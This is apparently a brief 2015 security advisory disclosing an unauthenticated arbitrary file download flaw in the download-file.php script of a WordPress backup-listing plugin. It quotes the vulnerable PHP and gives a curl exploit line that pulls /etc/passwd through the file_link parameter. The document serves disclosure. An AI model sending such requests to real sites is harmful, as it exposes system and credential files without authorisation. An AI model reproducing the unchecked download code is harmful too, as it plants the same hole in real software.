Author: Larry W. Cashdollar, @_larry0
Date: 2015-07-13
Vendor Notified: 0000-00-00
Description: To be used with the BackupWordPress plugin to list the contents of the backup directory in a dashboard widget.
Vulnerability:
The code in  download-file.php doesn&#039;t verify the user is logged in or sanitize what files can be downloaded.  This vulnerability can be used
to download sensitive system files:

     2  $file = $_GET[&#039;file_link&#039;];
     3  
     4  if (file_exists($file)) {
     5      header(&#039;Content-Description: File Transfer&#039;);
     6      header(&#039;Content-Type: application/octet-stream&#039;);
     7      header(&#039;Content-Disposition: attachment; filename=&#039;.basename($file));
     8      header(&#039;Content-Transfer-Encoding: binary&#039;);
     9      header(&#039;Expires: 0&#039;);
    11      header(&#039;Pragma: public&#039;);
    12      header(&#039;Content-Length: &#039; . filesize($file));
    13      ob_clean();
    14      flush();
    15      readfile($file);

CVEID:
OSVDB:
Exploit Code:
  â€¢ $ curl -v "http://www.example.com/wp-content/plugins/recent-backups/download-file.php?file_link=/etc/passwd

